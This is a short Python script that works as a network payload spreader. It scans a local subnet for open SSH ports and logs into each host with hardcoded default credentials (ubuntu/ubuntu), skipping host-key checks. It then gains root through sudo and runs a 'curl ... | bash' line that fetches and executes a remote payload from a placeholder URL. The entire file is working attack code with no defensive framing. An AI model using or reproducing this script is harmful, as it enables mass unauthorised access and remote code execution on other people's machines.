#!/usr/bin/env python3

import nmap3
import subprocess
import sys


class ctx(object):
    net = "192.168.1.1/24"
    username = "ubuntu"
    password = "ubuntu"
    payload_url = "http://0.0.0.0/payload"


nmap = nmap3.NmapHostDiscovery()


def scan_ports():
    scan = nmap.nmap_portscan_only(ctx.net, "-p 22")
    return scan


def get_servers():
    netw = scan_ports()
    ips = []

    for i in netw:
        try:
            if netw[i][0]["state"] == "open":
                ips.append(i)
        except KeyError:
            continue

    return ips


def push_payload(ip):
    out = subprocess.run(
        [
            "sshpass",
            "-p",
            ctx.password,
            "ssh",
            "-oStrictHostKeyChecking=no",
            f"{ctx.username}@{ip}",
            # download payload
            "echo",
            ctx.password,
            "|",
            "sudo",
            "-S",
            "bash",
            "-c",
            '"apt-get',
            "install",
            "curl",
            "-y",
            "&&",
            "curl",
            "-s",
            ctx.payload_url,
            "|",
            'bash"',
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    return out.stdout, out.stderr


def main():
    print(f"[  LOG  ] Scanning {ctx.net} network...")
    ips = get_servers()
    if len(ips) == 0:
        print("[  ERROR  ] No detected any open SSH server")
        sys.exit(1)
    else:
        print(f"[  LOG  ] Detected {len(ips)} open SSH server(s)")

    print(f"[  LOG  ] Servers IPs: {', '.join(ips)}")

    for i in ips:
        out, err = push_payload(i)
        print(f"[  LOG  ] {i}: Pushing payload")
        if err:
            print(f"[  ERROR  ] {err}")
        if out:
            print(f"[  LOG  ] {i}: {out}")


if __name__ == "__main__":
    main()
